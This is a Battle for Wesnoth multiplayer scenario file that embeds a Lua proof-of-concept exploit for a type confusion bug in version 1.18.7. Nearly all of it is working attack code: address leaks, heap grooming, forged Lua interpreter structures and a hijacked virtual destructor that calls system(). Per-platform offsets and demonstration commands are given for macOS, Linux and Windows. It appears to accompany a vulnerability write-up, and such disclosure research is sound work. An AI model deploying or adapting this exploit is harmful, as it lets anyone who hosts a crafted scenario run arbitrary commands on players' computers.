# Battle for Wesnoth 1.18.7 type confusion PoC
#
# Multiplayer scenario whose prestart event runs the embedded Lua exploit:
# leaked code and heap addresses plus a type-confused textdomain redirect a
# virtual destructor call to os_execute, which then calls system().
# Full walkthrough in the accompanying blog posts:
#   https://0day.gg/blog/pwning-wesnoth/
#   https://0day.gg/blog/pwning-wesnoth-part-2/
#
# Before running it, set TARGET_PLATFORM to the matching entry in PROFILES.

[multiplayer]
    id=universal_type_confusion_poc
    name="Universal type confusion PoC"
    description="Type confusion PoC"
    map_data="{multiplayer/maps/2p_Aethermaw.map}"
    turns=10
    experience_modifier=100%

    [side]
        side=1
        team_name="team1"
        controller="human"
        faction="Custom"
        no_leader=yes
    [/side]

    [side]
        side=2
        team_name="team2"
        controller="ai"
        faction="Custom"
        no_leader=yes
    [/side]

    [event]
        name=prestart
        [lua]
            code=<<
-- Tune the layout search and select the exact target build.
local MAX_LAYOUT_MASSAGE_ATTEMPTS = 20
local TARGET_PLATFORM = "macos-arm64"

-- Build-specific offsets and object sizes measured for three demonstration
-- targets. The same values can be derived programmatically for other builds to
-- populate a larger version table if you really wanted to.
local PROFILES = {
    -- Official Wesnoth 1.18.7 macOS arm64 release with bundled Lua 5.4.7.
    ["macos-arm64"] = {
        rng_size = 2520,
        os_execute_clock_delta = 0x31c,
        expected_call_clock_delta = 0x3eb79c,
        expected_gc_clock_delta = 0x3eb824,
        command = 'id>"${TMPDIR}wesnoth_hax";open -a Calculator',
    },
    -- Ubuntu 26.04 package 1:1.18.7-1 amd64 with dynamically linked Lua 5.4.8.
    ["linux-amd64"] = {
        rng_size = 5016,
        os_execute_clock_delta = 0x5060,
        -- The callbacks are in Wesnoth while os.clock is in the Lua shared
        -- object, so this profile has no stable cross-module callback delta.
        -- Use it only with the exact package above.
        command = 'id>/tmp/wesnoth_hax;command -v gnome-calculator&&gnome-calculator&',
    },
    -- Steam Wesnoth 1.18.7 Windows x86-64 release with Lua 5.4.8.
    ["windows-amd64"] = {
        rng_size = 2520,
        os_execute_clock_delta = -0xb0,
        expected_call_clock_delta = -0x7f8490,
        expected_gc_clock_delta = -0x7f84b0,
        command = 'cmd /c "(whoami>%TEMP%\\wesnoth_hax&start calc.exe)"',
    },
}

local NUL = string.char(0)

local function p64(n)
    local bytes = ""
    for i = 1, 8 do
        bytes = bytes .. string.char(n % 256)
        n = n // 256
    end
    return bytes
end

local function zeros(n) return string.rep(NUL, n) end

local function parse_addr(value)
    local text = tostring(value)
    local hex = text:match("0x(%x+)") or text:match(":%s*(%x%x%x%x%x%x+)")
    if hex then return tonumber(hex, 16) end
    return nil
end

local profile = PROFILES[TARGET_PLATFORM]
if profile == nil then
    wesnoth.log("error", "POC_UNSUPPORTED reason=invalid-target target=" .. tostring(TARGET_PLATFORM))
    return
end

local clock_addr = parse_addr(os.clock)
if clock_addr == nil then
    wesnoth.log("error", "POC_UNSUPPORTED reason=os-clock-pointer-parse")
    return
end

local RNG_UDATA_SZ = profile.rng_size
local TD_STRLEN = RNG_UDATA_SZ - 1

-- Encode a Lua 5.4 short TString node for the forged string table.
local function build_tstring(str, hnext_addr)
    local ts = p64(0)                                             -- [+0]  next = NULL
    ts = ts .. string.char(4, 0, 0, string.len(str))              -- [+8]  tt=4(VSHRSTR), marked=0, extra=0, shrlen
    ts = ts .. string.char(0, 0, 0, 0)                            -- [+12] hash = 0
    ts = ts .. p64(hnext_addr)                                    -- [+16] u.hnext
    ts = ts .. str .. NUL                                         -- [+24] contents
    ts = ts .. zeros(32 - string.len(ts))                         -- pad to 32 bytes
    return ts
end


-- Retrieve gen_gc for final dispatch. If a profile provides expected callback
-- offsets, use them to reject a mismatched target build.
local gen = wesnoth.name_generator("markov", "aa,bb,cc")
local gen_mt = getmetatable(gen)
local gen_call = gen_mt.__call
local gen_gc = gen_mt.__gc
local call_addr = parse_addr(tostring(gen_call))
local gc_addr = parse_addr(tostring(gen_gc))
local supported = clock_addr ~= nil
    and call_addr ~= nil
    and gc_addr ~= nil
    and (profile.expected_call_clock_delta == nil
        or call_addr - clock_addr == profile.expected_call_clock_delta)
    and (profile.expected_gc_clock_delta == nil
        or gc_addr - clock_addr == profile.expected_gc_clock_delta)

local os_execute_addr = nil
if supported then
    os_execute_addr = clock_addr + profile.os_execute_clock_delta
    wesnoth.log("error", string.format(
        "POC_PROFILE profile=%s clock=0x%x call_delta=0x%x gc_delta=0x%x",
        TARGET_PLATFORM, clock_addr, call_addr - clock_addr, gc_addr - clock_addr))
else
    wesnoth.log("error", "POC_UNSUPPORTED profile=" .. TARGET_PLATFORM
        .. " clock=" .. tostring(clock_addr)
        .. " call=" .. tostring(call_addr) .. " gc=" .. tostring(gc_addr))
end

-- Prime the tested allocator state, then stop automatic GC so unrelated
-- finalizers cannot add competing free blocks. Explicit collections still run.
local warm_td = wesnoth.textdomain("warmup")
warm_td = nil
gen = nil
collectgarbage("collect")
collectgarbage("stop")

-- The command starts at byte 184 and must end before global_State at byte 256.
-- Accounting for its terminating NUL leaves at most 71 command bytes.
local cmd = profile.command
assert(string.len(cmd) <= 71)

-- Keep every attempt's allocations live through dispatch.
local keepalive = table.pack()
local dispatch_attempted = false
if supported then
for attempt = 1, MAX_LAYOUT_MASSAGE_ATTEMPTS do
    local target = Rng.create()
    local target_addr = parse_addr(tostring(target))
    assert(target_addr ~= nil)
    -- All internal payload pointers use target_addr as their base.
    local base = target_addr

    -- Bytes 0-55: forged name_generator/lua_State overlap.
    local core = p64(base + 56)                                  -- [0]   vtable ptr
        .. p64(0)                                                -- [8]   padding
        .. p64(base + 152)                                       -- [16]  L->top
        .. p64(base + 256)                                       -- [24]  L->l_G -> forged global_State
        .. p64(base + 72)                                        -- [32]  L->ci -> forged CallInfo
        .. p64(base + 200)                                       -- [40]  L->stack_last
        .. p64(base + 104)                                       -- [48]  L->stack

    -- Bytes 56-71: forged name_generator vtable. __gc invokes slot 1, the
    -- virtual destructor; slot 0 is generate() and is not used by this callback.
        .. p64(0)                                                -- [56]  vtable[0] = generate (unused)
        .. p64(os_execute_addr)                                  -- [64]  vtable[1] = virtual destructor

    -- Bytes 72-103: CallInfo used by Lua to resolve argument 1.
        .. p64(base + 104)                                       -- [72]  CI.func -> stack[0]
        .. p64(base + 200)                                       -- [80]  CI.top (room for 3 pushes)
        .. p64(0)                                                -- [88]  CI.prev = NULL
        .. p64(0)                                                -- [96]  CI.next = NULL

    -- Bytes 104-199: fake stack. stack[1] holds the command, and L->top at byte
    -- 152 leaves room for three result TValues. Those writes may overlap the
    -- command TString at byte 160 after system() consumes it.
        .. p64(0)                                                -- [104] stack[0].value = nil
        .. zeros(8)                                              -- [112] stack[0].tt_ = 0
        .. p64(base + 160)                                       -- [120] stack[1].value = TString* (command)
        .. string.char(0x44, 0, 0, 0, 0, 0, 0, 0)               -- [128] stack[1].tt_ = 0x44 (VSHRSTR)
        .. zeros(24)                                             -- [136] initial stack storage through byte 159

    -- Bytes 160 onward initially hold the TString and system() command.
        .. p64(0)                                                -- [160] TString.next
        .. string.char(4, 0, 0, string.len(cmd), 0, 0, 0, 0)    -- [168] tt=4, marked=0, extra=0, shrlen, hash=0
        .. p64(0)                                                -- [176] TString.u.hnext
        .. cmd .. NUL                                            -- [184] command string

    -- Pad the command region to the forged global_State base at byte 256.
    core = core .. zeros(256 - string.len(core))

    -- Bytes 256-1671: fields read through lua_State.l_G while os_execute and
    -- luaL_execresult push their results. In particular:
    --   g+24:  non-positive GCdebt prevents a GC step through null callbacks
    --   g+48:  strt.hash points to the forged one-bucket string table
    --   g+60:  strt.size=1 routes every string lookup to that bucket
    --   g+552: all 106 cache entries point to a valid empty TString
    local g = zeros(48)                                          -- g+0 to g+47: frealloc,ud,totalbytes,GCdebt,etc all 0
        .. p64(base + 1672)                                      -- g+48: strt.hash -> bucket array
        .. zeros(4)                                              -- g+56: strt.nuse = 0
        .. string.char(1, 0, 0, 0)                               -- g+60: strt.size = 1
        .. zeros(488)                                            -- g+64 to g+551: l_registry thru mt[] all zeros
        .. string.rep(p64(base + 1744), 106)                     -- g+552: strcache -> empty TString (848 bytes)
        .. zeros(16)                                             -- g+1400: warnf + ud_warn = 0

    -- Bytes 1672-1775: one string-table bucket containing valid short-string
    -- nodes for both status labels that luaL_execresult can request, plus the
    -- empty string used by all forged cache entries.
    local extra = p64(base + 1680)                               -- bucket[0] -> "exit"
        .. build_tstring("exit", base + 1712)                    -- chain -> "signal"
        .. build_tstring("signal", 0)                            -- end of chain
        .. build_tstring("", 0)                                  -- strcache target

    -- Pad to exactly the textdomain payload size required for allocator reuse.
    local payload = core .. g .. extra
    payload = payload .. zeros(TD_STRLEN - string.len(payload))


    assert(string.len(payload) == TD_STRLEN)

    -- Reclaim the original Rng and drop intermediate string references, leaving
    -- payload as the complete live byte sequence.
    target = nil
    core = nil
    g = nil
    extra = nil
    collectgarbage("collect")
    collectgarbage("collect")
    collectgarbage("collect")

    -- Each nonmatching probe occupies a wrong slot. Keep it alive so that slot
    -- stays unavailable and the next Rng must come from somewhere else.
    local fillers = table.pack()
    local matched_probe = nil
    local matched_fill = nil
    for fill = 1, 512 do
        local probe = Rng.create()
        local probe_addr = parse_addr(tostring(probe))
        assert(probe_addr ~= nil)
        if probe_addr == target_addr then
            matched_probe = probe
            matched_fill = fill
            break
        end
        fillers[#fillers + 1] = probe
    end

    if matched_probe ~= nil then
        matched_probe = nil
        -- Fully reclaim it, then allocate textdomain before any other same-sized object.
        collectgarbage("collect")
        collectgarbage("collect")
        collectgarbage("collect")
        local td = wesnoth.textdomain(payload)
        -- textdomain copies payload; retain payload, td, and fillers through dispatch.
        keepalive[#keepalive + 1] = table.pack(payload, td, fillers)
        -- Log dispatch intent before entering native code; this is not execution proof.
        wesnoth.log("error", string.format(
            "POC_DISPATCH attempt=%d target=0x%x fill=%d",
            attempt, target_addr, matched_fill))
        -- pcall covers Lua errors, not native faults or command status. Use the
        -- platform-specific oracle to confirm execution.
        local protected_ok, detail = pcall(gen_gc, td)
        wesnoth.log("error", "POC_CALLBACK_RETURN protected_ok="
            .. tostring(protected_ok) .. " detail=" .. tostring(detail))
        dispatch_attempted = true
        break
    end

    -- No exact reclaim: keep these allocations live and reject without native
    -- dispatch. The forged pointers would be invalid at any other address.
    keepalive[#keepalive + 1] = table.pack(payload, fillers)
    wesnoth.log("error", string.format(
        "POC_SAFE_REJECT attempt=%d target=0x%x probes=512",
        attempt, target_addr))
end
end

if supported and not dispatch_attempted then
    wesnoth.log("error", string.format(
        "POC_EXHAUSTED attempts=%d", MAX_LAYOUT_MASSAGE_ATTEMPTS))
end
-- Resume automatic collection before returning; keepalive still spans dispatch.
collectgarbage("restart")
 >>
        [/lua]
    [/event]
[/multiplayer]
